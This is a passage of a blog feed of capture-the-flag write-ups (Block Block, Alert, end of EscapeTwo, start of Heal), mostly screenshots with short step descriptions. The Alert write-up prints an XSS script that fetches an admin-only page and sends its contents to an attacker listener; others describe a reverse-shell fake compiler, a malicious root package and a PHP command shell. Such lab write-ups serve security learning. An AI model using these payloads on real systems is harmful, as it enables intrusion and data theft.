+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_25.png" alt="image.png" /></p>
+
+<p>Now that we have this .pfx file as administrator we are able to authenticate and steal the NT hash for administrator, which means privilege escalation were success</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_26.png" alt="image.png" /></p>
+
+<p>Machine pwned!!!</p>]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[EscapeTwo]]></summary></entry><entry><title type="html">Block Block 15eb9525529180579f72c0f73b96d93e</title><link href="https://your-site-url/writeups/2025/07/15/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf.html" rel="alternate" type="text/html" title="Block Block 15eb9525529180579f72c0f73b96d93e" /><published>2025-07-15T16:05:57+00:00</published><updated>2025-07-15T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/15/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/15/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf.html"><![CDATA[<h1 id="block-block">Block Block</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>Start with enumerating port</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image.png" alt="image.png" /></p>
+
+<p>SSH is running and a web application has werkzeug behind</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_1.png" alt="image.png" /></p>
+
+<p>Looking around the web application we can self register and</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_2.png" alt="image.png" /></p>
+
+<p>A bot is running on it</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_3.png" alt="image.png" /></p>
+
+<p>When we talk with the bot we are being redirected to /api/info with our jwt, that token it might be important for the foothold</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_4.png" alt="image.png" /></p>
+
+<p>We can also review contract source</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_5.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_6.png" alt="image.png" /></p>
+
+<p>Admin user is required to access to other functionalities</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_7.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_8.png" alt="image.png" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>We also can report a user, it should be sended to admin, so lets try xss</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_9.png" alt="image.png" /></p>
+
+<p>This would be our payload using javascript functions as we saw the web application has js on it</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_10.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_11.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_12.png" alt="image.png" /></p>
+
+<p>Now we can access to admin pane</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_13.png" alt="image.png" /></p>
+
+<p>In the source code 2 routes are disclosed</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_14.png" alt="image.png" /></p>
+
+<p>That is an authorization api key or something like that</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_15.png" alt="image.png" /></p>
+
+<p>On the other path there is an address</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_16.png" alt="image.png" /></p>
+
+<p>With the authorization encoded and the address we can perform a request to disclose information using as a base line the source code found as admin. Use eth_balance as the first method using the same request in the source code</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_17.png" alt="image.png" /></p>
+
+<p>We have no found anything in there something important is the fact that possibly ethereum is being used on this, due that method, search a little bit about it</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_18.png" alt="image.png" /></p>
+
+<p>something important is the fact that possibly ethereum is being used on this, due that method, search a little bit about it</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_19.png" alt="image.png" /></p>
+
+<p>eth_account sounds interesting, it returns a list of addresses owned by the client</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_20.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_21.png" alt="image.png" /></p>
+
+<p>Here we have one, but nothing useful returned</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_22.png" alt="image.png" /></p>
+
+<p>this one sound good, but first we need the number</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_23.png" alt="image.png" /></p>
+
+<p>Let’s use this one first</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_24.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_25.png" alt="image.png" /></p>
+
+<p>The latest block number was returned</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_26.png" alt="image.png" /></p>
+
+<p>We are going to use this for return the whole block, we had to change boolean value to true due to it is question itself if the whole transactions are being included in the request</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_27.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_28.png" alt="image.png" /></p>
+
+<p>We have information, good. Now we need to be abe to read it, in those cases we can use something like <code class="language-plaintext highlighter-rouge">solcjs</code>  or <code class="language-plaintext highlighter-rouge">ethereum input data decoder</code> but it didn’t work here, as we can see it looks like hex, use ciberchef</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_29.png" alt="image.png" /></p>
+
+<p>Effectively data is being returned but that is info about the last block that we had controlled as user role</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_30.png" alt="image.png" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">0xd</code> means 13 on decimal, let’s go to the first block then</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_31.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_32.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_33.png" alt="image.png" /></p>
+
+<p>At the start it looks like it doesn’t have anything but in the last part of the code some plain text creds are disclosed, and that’s how we got user flag</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_34.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>Now we are keira user</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_35.png" alt="image.png" /></p>
+
+<p>We can execute a binary named forge, this tool helps to  build, test, fuzz, debug and deploy Solidity smart contracts.</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_36.png" alt="image.png" /></p>
+
+<p>In the documentation we can find commands like init which creates a new project</p>
+
+<p>Once we have a new project ready for build, create a rev shell in a file which later will be call as a solc compiler instead of using the default one</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_37.png" alt="image.png" /></p>
+
+<p>This will create a shell as paul</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_38.png" alt="image.png" /></p>
+
+<p>No we can run as root pacman tool, which is a package manager, we are going to create our new malicious package, first create a file named pkgbuild which will have all the specifications on it, and let’s say it that install our payload (pwn.install)</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_39.png" alt="image.png" /></p>
+
+<p>This file will contain the payload we want to execute inside the post_install function</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_40.png" alt="image.png" /></p>
+
+<p>make the .pkg.tar.zst which is the package ready to be install</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_41.png" alt="image.png" /></p>
+
+<p>Now just install package, it will create a shell as root</p>
+
+<p><img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_a476157b_c25c_4f91_91b1_401c8184ac79.png" alt="image.png" /></p>
+
+<p>Machine pwned!!!</p>]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Block Block]]></summary></entry><entry><title type="html">Alert 14eb9525529180c9b200f28db6068308</title><link href="https://your-site-url/writeups/2025/07/15/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f.html" rel="alternate" type="text/html" title="Alert 14eb9525529180c9b200f28db6068308" /><published>2025-07-15T16:05:57+00:00</published><updated>2025-07-15T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/15/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/15/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f.html"><![CDATA[<h1 id="alert">Alert</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>Start enumerating ports, there is a web application running, and a ssh service we may need to find some creds</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image.png" alt="image.png" /></p>
+
+<p>We can perform some actions like, view a .md file, exploring the web application there is a message suggesting report any trouble through contact us</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_1.png" alt="image.png" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>Let’s keep enumerating the machine listing directories, there is another one called messages, if we try to send a request to it it doesn’t show anything it may be allowed to show info only to admin</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_2.png" alt="image.png" /></p>
+
+<p>Messages is also present in here</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_3.png" alt="image.png" /></p>
+
+<p>We tried to upload js code to perform a xss attack, it seems to be vulnerable to it but there are no cookies to steal and we are not able to do anything else different from share the .md file, so we could attempt to fetch files as whoever is behind contact us and send that information to a listener we will set up</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+fetch("http://alert.htb/index.php?page=messages")
+	.then(response =&gt; response.text())
+	.then(data =&gt; <span class="si">{</span>
+	<span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http:/0.0.0.0:0000/?data=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">data</span><span class="p">));</span>
+	<span class="si">}</span>)
+	.catch(error =&gt; console.error("Error", error));
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div></div>
+
+<p>Send the payload but before clicking it in share, intercept the request, copy and paste the link and send it to contact us interface</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_4.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_5.png" alt="image.png" /></p>
+
+<p>It will be sent successfully</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_6.png" alt="image.png" /></p>
+
+<p>And we will receive the info in the netcat listener</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_7.png" alt="image.png" /></p>
+
+<p>Decode it using cyberchef, there is a .txt file on it and it is disclosing the way to access files with messages php script, there may be a LFI</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_8.png" alt="image.png" /></p>
+
+<p>There is a Apache2 server running</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_9.png" alt="image.png" /></p>
+
+<p>Check default configuration files</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_10.png" alt="image.png" /></p>
+
+<p>It give us the whole configurations and the file where a password is stored</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_11.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_12.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_13.png" alt="image.png" /></p>
+
+<p>Check the content on .htpasswd</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_14.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_15.png" alt="image.png" /></p>
+
+<p>Albert hash found</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_16.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_17.png" alt="image.png" /></p>
+
+<p>Log in as Albert and  get user flag</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_18.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>To escalate privileges we found in <code class="language-plaintext highlighter-rouge">/opt/website-monitor</code> files that seems to run a web application, root is the owner but management group can performs some tasks in config files</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_19.png" alt="image.png" /></p>
+
+<p>Effectively we are part of management group</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_20.png" alt="image.png" /></p>
+
+<p>And there is a local service running on port 8080</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_21.png" alt="image.png" /></p>
+
+<p>We could forward that port to get more information of this, but i think that we have the necessary to elevate our privileges, furthermore we have the base path where files are requested</p>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_22.png" alt="image.png" /></p>
+
+<ol>
+  <li>Create a new .php file opening the door to get requests executing commands</li>
+  <li>Make a request executing whatever command we want through the file we’ve created previously</li>
+</ol>
+
+<p><img src="/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_23.png" alt="image.png" /></p>
+
+<p>Machine Pwned!!!</p>]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Alert]]></summary></entry><entry><title type="html">Heal 15eb9525529180ab8095d9465156425b</title><link href="https://your-site-url/writeups/2025/07/15/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f.html" rel="alternate" type="text/html" title="Heal 15eb9525529180ab8095d9465156425b" /><published>2025-07-15T16:05:57+00:00</published><updated>2025-07-15T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/15/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/15/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f.html"><![CDATA[<h1 id="heal">Heal</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>Start with port recognizing, we only found two ports, ssh and http running nginx on it</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image.png" alt="image.png" /></p>
+
+<p>At first instance there are a login interface, default credentials aren’t useful to bypass authentication</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_1.png" alt="image.png" /></p>
+
+<p>Just create a new account to see what’s inside</p>
+
